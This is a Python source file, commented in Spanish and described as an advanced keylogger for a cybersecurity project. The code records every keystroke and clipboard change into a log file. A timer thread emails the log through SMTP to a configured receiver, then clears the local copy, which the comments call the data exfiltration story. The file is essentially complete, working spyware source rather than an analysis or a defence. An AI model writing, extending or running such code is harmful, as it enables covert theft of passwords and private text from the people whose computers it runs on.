# -*- coding: utf-8 -*-

"""
Keylogger avanzado para proyecto de ciberseguridad.

Este script implementa varias de las funcionalidades como
captura de teclas, monitoreo del portapapeles y exfiltración de datos por email.
"""

# Importaciones de librerías estándar y de terceros
import os
import threading
import time
import logging
import configparser
from datetime import datetime
import sys

# pynput para la captura de teclado
from pynput import keyboard

# pyperclip para el monitoreo del portapapeles
try:
    import pyperclip
except ImportError:
    print("[ADVERTENCIA] La librería 'pyperclip' no está instalada. El monitoreo del portapapeles no funcionará.")
    print("Para instalarla, ejecuta: pip install pyperclip")
    pyperclip = None

# smtplib para el envío de correos electrónicos
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class Keylogger:
    #Clase principal que encapsula toda la lógica del Keylogger.
    #Es modular, configurable y extensible.    

    def __init__(self, config_file='config.ini', stop_keys=None):
        #Inicializa el Keylogger cargando la configuración y preparando el logging.
        
        # --- 1. Carga de Configuración ---
        self.config = configparser.ConfigParser()
        if not os.path.exists(config_file):
            raise FileNotFoundError(f"El archivo de configuración '{config_file}' no se encontró. Por favor, créalo.")
        self.config.read(config_file)

        # --- 2. Configuración del Logging ---
        # En lugar de escribir directamente a un archivo, usamos el módulo 'logging'
        # que es más robusto y profesional.
        log_filename = self.config.get('General', 'log_file', fallback='keylog.txt')
        logging.basicConfig(
            filename=log_filename,
            level=logging.DEBUG,
            format='%(asctime)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

        # --- 3. Atributos y Estado Interno ---
        self.stop_keys = stop_keys if stop_keys else [keyboard.Key.esc]
        self.last_clipboard_content = ""

        # --- 4. Configuración del reporte por email ---
        self.reporting_interval = self.config.getint('General', 'report_interval_seconds', fallback=300)

        # Determinar el sistema operativo
        self.os_type = self._detect_os()

    def _detect_os(self):
        """
        Detecta el sistema operativo y devuelve 'Linux' o 'Windows'.
        """
        if sys.platform.startswith('win'):
            return 'Windows'
        elif sys.platform.startswith('linux'):
            return 'Linux'
        else:
            return 'Unknown'

    def _on_press(self, key):
        """
        Callback que se ejecuta cada vez que una tecla es presionada.
        Registra la tecla en el archivo de log.
        """
        try:
            # Si es una tecla alfanumérica, la registramos como tal
            self.logger.info(f"Tecla presionada: {key.char}")
        except AttributeError:
            # Si es una tecla especial (Shift, Ctrl, etc.), la registramos con su nombre
            self.logger.info(f"Tecla especial presionada: {key}")

    def _on_release(self, key):
        """
        Callback que se ejecuta cuando una tecla es liberada.
        Comprueba si es la tecla de parada de emergencia.
        """
        if key in self.stop_keys:
            self.logger.warning("--- Captura finalizada por el usuario (Ctrl + Shift + Esc) ---")
            # Devuelve False para detener el listener de pynput
            return False

    def _send_email_report(self):
        """
        Implementa la User Story de "exfiltrar los datos".
        Envía el contenido del log por email y lo limpia.
        """
        try:
            with open(self.config.get('General', 'log_file'), 'r', encoding='utf-8') as f:
                log_content = f.read()

            if not log_content.strip():
                self.logger.info("El archivo de log está vacío.")
                return

            # Construcción del mensaje de email
            msg = MIMEMultipart()
            msg['From'] = self.config.get('Email', 'sender_email')
            msg['To'] = self.config.get('Email', 'receiver_email')
            msg['Subject'] = f"--- Reporte de Keylogger --- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            body = f"Adjunto se encuentra el registro de actividad:\n\n{log_content}"
            msg.attach(MIMEText(body, 'plain'))

            # Conexión y envío
            server = smtplib.SMTP(self.config.get('Email', 'smtp_server'), self.config.getint('Email', 'smtp_port'))
            server.starttls()
            server.login(self.config.get('Email', 'sender_email'), self.config.get('Email', 'sender_password'))
            server.send_message(msg)
            server.quit()

            self.logger.info("Reporte enviado por email exitosamente.")

            # Limpiamos el archivo de log después de enviarlo
            open(self.config.get('General', 'log_file'), 'w').close()

        except Exception as e:
            self.logger.error(f"Error al enviar el reporte por email: {e}")

    def _report_periodically(self):
        #Función que se ejecuta en un hilo para enviar reportes periódicamente.
        self._send_email_report()
        # Volvemos a programar la ejecución de esta misma función en el futuro
        timer = threading.Timer(self.reporting_interval, self._report_periodically)
        timer.daemon = True # Permite que el programa principal termine aunque el timer esté activo
        timer.start()

    def _monitor_clipboard(self):
        """
        Implementa la tarea "Capturación de Portapapeles".
        Se ejecuta en un hilo separado y revisa cambios en el portapapeles.
        """
        if not pyperclip:
            return # No hacer nada si la librería no está disponible

        while True:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != self.last_clipboard_content:
                    self.last_clipboard_content = current_clipboard
                    self.logger.info(f"ACTUALIZACIÓN DEL PORTAPAPELES: '{current_clipboard}'")
            except Exception as e:
                 self.logger.error(f"Error al leer del portapapeles: {e}")
            time.sleep(2) #Espera 2 segundos antes de volver a comprobar

    def start(self):
        #Inicia todos los componentes del keylogger
        self.logger.warning("\n--- Iniciando captura de teclado ---")
        self.logger.info(f"Presiona la combinación de teclas '{', '.join(str(key) for key in self.stop_keys)}' para detener.")

        # Iniciar monitoreo del portapapeles en un hilo separado 
        clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
        clipboard_thread.start()

        #Iniciar el reporte periódico por email
        self._report_periodically()

        # Iniciar el listener de teclado (bloquea el hilo principal)
        with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as listener:
            listener.join()

if __name__ == "__main__":
    stop_keys = [keyboard.Key.ctrl, keyboard.Key.shift, keyboard.Key.esc]
    if sys.platform.startswith('win'):
        print("Este keylogger solo está diseñado para ejecutarse en sistemas Linux.")
        sys.exit(1)

    try:
        keylogger = Keylogger(stop_keys=stop_keys)
        keylogger.start()
    except FileNotFoundError as e:
        print(f"[ERROR CRÍTICO] {e}")
    except Exception as e:
        print(f"[ERROR INESPERADO] Ocurrió un error: {e}")